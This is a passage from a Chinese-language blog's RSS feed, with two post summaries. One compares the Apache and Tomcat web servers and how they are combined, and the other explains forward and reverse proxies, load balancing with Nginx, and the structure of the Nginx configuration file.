      <description>1.Apache  C语言实现的，专门用来提供HTTP服务的程序 特性：简单、速度快、性能稳定、可配置（代理），主要用于解析静态文本，并发性能高，侧重于HTTP服务 支持静态页（HTML），不支持动态请求如：CGI、Servlet/JSP、PHP、ASP等 具有很强的可扩展性，可以通过插件支持PHP，还可以单向Apache连接Tomcat实现连通。Apache是世界使用排名第一的Web服务器  2.Tomcat  是Java开发的一个符合JavaEE的Servlet规范的JSP服务器（Servlet容器），是 Apache 的扩展。免费的Java应用服务器 主要用于解析JSP/Servlet，侧重于Servlet引擎 支持静态页，但效率没有Apache高；支持Servlet、JSP请求 Tomcat本身也内置了一个HTTP服务器用于支持静态内容，可以通过Tomcat的配置管理工具实现与Apache整合  3.Apache + Tomcat 如果请求是静态网页则由Apache处理，并将结果返回；如果是动态请求，Apache会将解析工作转发给Tomcat处理，Tomcat处理后将结果通过Apache返回。这样可以达到分工合作，提高系统的性能的效果。</description>
    </item>
    
    <item>
      <title>Web服务器(1)——Nginx 反向代理</title>
      <link>https://ac-lm.github.io/posts/web/web%E6%9C%8D%E5%8A%A1%E5%99%A81nginx-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</link>
      <pubDate>Mon, 02 Mar 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/web/web%E6%9C%8D%E5%8A%A1%E5%99%A81nginx-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</guid>
      <description>1.什么是正向代理与反向代理 正向代理隐藏了真实的请求客户端，服务端不知道真实的客户端是谁，客户端通过代理服务器来访问服务端，客户端所有的请求都通过代理服务器来发送。某些科学上网工具就是典型的正向代理角色，通过在国外搭建一台代理服务器，让代理代替我去发送请求，然后代理服务器再把响应返回给我。
反向代理隐藏了真实的服务端，客户不知道真正提供服务人的是谁，客户只需要访问反向代理服务器便可以获取到响应。例如，当我们请求百度的时候，可能有成千上万台服务器准备为我们服务，但具体是哪一台就不清楚了。但实际上，我们不需要知道这个，只需要知道反向代理服务器 www.baidu.com 就可以了，反向代理服务器会帮我们把请求转发到真实的服务器那里去。
两者的区别在于代理的对象不一样： 正向代理是为客户端代理，反向代理是为服务端代理。
2.通过Nginx实现反向代理 Nginx是最为流行的反向代理服务器之一，而且能用来实现负载均衡。
什么是负载均衡？就是把项目部署在不同的服务器上，但是通过统一的域名进入，由Nginx对请求进行分发，最终减轻服务器的压力。此时，Nginx服务器仅作为分发服务器，而真正的内容可以放在其他的服务器上，这样来，还能起到一层安全隔壁的作用，Nginx作为隔离层。其次，Nginx还能解决跨域的问题。
3.Nginx的配置文件 1.全局块 该部分配置主要影响Nginx全局，通常包括下面几个部分：
 配置运行Nginx服务器用户（组） worker process数 Nginx进程PID存放路径 错误日志的存放路径 配置文件的引入  2.events块 该部分配置主要影响Nginx服务器与用户的网络连接，主要包括：
 设置网络连接的序列化 是否允许同时接收多个网络连接 事件驱动模型的选择 最大连接数的配置  3.http块 这部分是负责网页相关的配置
 定义MIMI-Type 自定义服务日志 允许sendfile方式传输文件 连接超时时间 单连接请求数上限  4.server块 这部分是负责服务器相关的配置
 配置网络监听 基于名称的虚拟主机配置 基于IP的虚拟主机配置  5.location块 本地文件配置
 请求根目录配置 更改location的URI 网站默认首页配置  4. 代码解析 1. 全局块&amp;mdash;-配置运行Nginx服务器用户（组） user user [group]; #user：指定可以运行Nginx服务器的用户 #group：可选项，可以运行Nginx服务器的用户组 user nobody nobody; #如果user指令不配置或者配置为nobody nobody，则默认所有用户都可以启动Nginx进程 ------------------------------------------------------------------------------- worker_processes number | auto; #number：Nginx进程最多可以产生的worker process数 #auto：Nginx进程将自动检测 worker_processes 3; #在后台查看进程//ps -aux | grep nginx//能发现开启了3个worker process进程 ------------------------------------------------------------------------------- error_log file | stderr; #file：日志输出到某个文件file #stderr：日志输出到标准错误输出 error_log logs/error.</description>
    </item>
    
  </channel>
</rss>
